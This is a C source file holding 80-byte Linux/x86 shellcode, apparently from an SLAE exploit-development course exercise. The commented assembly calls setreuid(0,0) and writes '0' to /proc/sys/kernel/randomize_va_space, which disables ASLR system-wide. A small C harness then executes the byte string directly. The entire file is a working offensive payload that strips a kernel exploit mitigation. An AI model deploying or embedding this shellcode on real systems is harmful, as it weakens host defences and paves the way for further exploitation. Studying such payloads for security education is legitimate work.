/*
 Linux/x86
 setuid-disable-aslr.c by @abatchy17 - abatchy.com
 Shellcode size: 80 bytes
 SLAE-885

 section .text
 global _start

 _start:

 ;
 ; setruid(0,0)
 ;
 xor    ecx,ecx
 mov    ebx,ecx
 push   0x46
 pop    eax
 int    0x80

 ;
 ; open("/proc/sys/kernel/randomize_va_spaceX", O_RDWR)
 ;
 xor eax,eax     ; EAX = 0
 jmp aslr_file
 shellcode:
 pop ebx         ; EBX now points to '/proc/sys/kernel/randomize_va_space'
 mov byte [ebx + 35],al
 push byte 5
 pop eax
 push byte 2
 pop ecx
 int 80h

 ;
 ; write(fd, '0', 1)
 ;
 xchg eax, ebx   ; One byte less than mov ebx, eax
 push byte 4
 pop eax
 xchg ecx, edx   ; ECX already contains 2
 dec edx
 push byte 0x30
 mov ecx, esp    ; ECX now points to "0"
 int 80h         ; EAX will now contains 1

 ;
 ; exit(0)
 ;
 int 80h         ; Yep, that's it

 aslr_file:
 call shellcode  ; Skips the filename and avoids using JMP
 db '/proc/sys/kernel/randomize_va_space'
*/

#include <stdio.h>
#include <string.h>

unsigned char sc[] = "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x31\xc0\xeb\x1b\x5b\x88\x43\x23\x6a\x05\x58\x6a\x02\x59\xcd\x80\x93\x6a\x04\x58\x87\xca\x4a\x6a\x30\x89\xe1\xcd\x80\xcd\x80\xe8\xe0\xff\xff\xff\x2f\x70\x72\x6f\x63\x2f\x73\x79\x73\x2f\x6b\x65\x72\x6e\x65\x6c\x2f\x72\x61\x6e\x64\x6f\x6d\x69\x7a\x65\x5f\x76\x61\x5f\x73\x70\x61\x63\x65";

int main()
{
    printf("Shellcode size: %d\n", strlen(sc));
    int (*ret)() = (int(*)())sc;
    ret();
}